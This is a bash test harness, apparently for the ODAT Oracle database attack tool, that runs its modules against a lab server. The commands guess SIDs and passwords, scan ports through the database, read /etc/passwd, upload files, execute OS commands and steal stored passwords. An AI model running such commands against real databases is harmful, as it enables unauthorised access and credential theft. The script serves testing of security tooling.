#!/bin/bash
#Constants
ALL_IS_OK=0
#Connection information
SERVER=192.168.142.73
SID=ORCL
USER="SYS"
PASSWORD=''
#OPTIONS
VERBOSE='' #'> /dev/null'


tests=( "./odat.py all -s $SERVER"
	"./odat.py all -s $SERVER --accounts-file=./accounts_small.txt --sid-charset '01' --sids-max-size=2"
	"./odat.py all -s $SERVER --no-alias-like-sid --sids-file=./sids.txt"
	"./odat.py all -s $SERVER -d $SID" 
	"./odat.py all -s $SERVER -d $SID -U $USER -P $PASSWORD"
	"./odat.py all -s $SERVER -d $SID -U $USER -P $PASSWORD"
	"./odat.py sidguesser -s $SERVER --sids-max-size=1 --sid-charset='1234'"
	"./odat.py sidguesser -s $SERVER --sids-file=./sids.txt"
	"./odat.py passwordguesser -s $SERVER -d $SID"
	"./odat.py passwordguesser -s $SERVER -d $SID --accounts-file=./accounts_small.txt"
	"./odat.py utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"./odat.py utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 1521,443,22"
	"./odat.py utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 20-30"
	"echo 'GET / HTTP/1.0\n' > ./temp.txt; ./odat.py utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --send google.com 80 temp.txt ;rm ./temp.txt"
	"./odat.py httpuritype -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"./odat.py httpuritype -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 1521,443,22"
	"./odat.py httpuritype -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 20-30"
	"./odat.py httpuritype -s $SERVER -d $SID -U $USER -P $PASSWORD --url 127.0.0.1:80"
	"./odat.py utltcp -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"./odat.py utltcp -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 1521,443,22"
        "./odat.py utltcp -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 20-30"
	"echo 'GET / HTTP/1.0\n\n' > ./temp.txt; ./odat.py utltcp -s $SERVER -d $SID -U $USER -P $PASSWORD --send-packet 127.0.0.1 80 ./temp.txt ;rm ./temp.txt"
	"./odat.py ctxsys -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"./odat.py ctxsys -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile /etc/passwd"
	"./odat.py externaltable -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"./odat.py externaltable -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile  /tmp/ temp.sh passwd.txt"
	"./odat.py externaltable -s $SERVER -d $SID -U $USER -P $PASSWORD --exec /tmp/ temp.sh"
	"./odat.py dbmsxslprocessor -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"./odat.py dbmsxslprocessor -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt accounts_small.txt"
	"./odat.py dbmsadvisor -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"./odat.py dbmsadvisor -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/: file.txt ./accounts_small.txt"
	"./odat.py utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module --getFile /etc/ passwd passwd.txt"
	"./odat.py utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt accounts_small.txt"
	"./odat.py utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --removeFile /tmp/ file.txt"
	"./odat.py dbmsscheduler -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"./odat.py dbmsscheduler -s $SERVER -d $SID -U $USER -P $PASSWORD --exec /bin/ls"
	"./odat.py java -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"./odat.py passwordstealer -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"./odat.py passwordstealer -s $SERVER -d $SID -U $USER -P $PASSWORD --get-passwords-from-history"
	"./odat.py passwordstealer -s $SERVER -d $SID -U $USER -P $PASSWORD --get-passwords"
	"./odat.py oradbg -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
	"./odat.py oradbg -s $SERVER -d $SID -U $USER -P $PASSWORD --exec /bin/ls"
	"sudo ./odat.py stealRemotePwds -s $SERVER -d $SID --test-module"
	"sudo ./odat.py stealRemotePwds -s $SERVER -d $SID --user-list accounts_small.txt --get-all-passwords"
	"sudo chmod o+r sessions-$SERVER-1521-$SID.txt; ./odat.py stealRemotePwds -s $SERVER -d $SID --decrypt-sessions sessions-$SERVER-1521-$SID.txt accounts_small.txt"
	
      )

function isGoodReturnValue {
	if [ "$1" -eq "$ALL_IS_OK" ]
	then
		echo -e "    \e[0;32mOK!\e[0;m"
	else
		echo -e "    \e[0;31mKO!\e[0;m"
	fi
} 

for aTest in "${tests[@]}"
do
	echo -e "\n\e[1m\e[96m[+] TEST that : $aTest $VERBOSE \e[m"
	eval "$aTest $VERBOSE"
	isGoodReturnValue $?
done
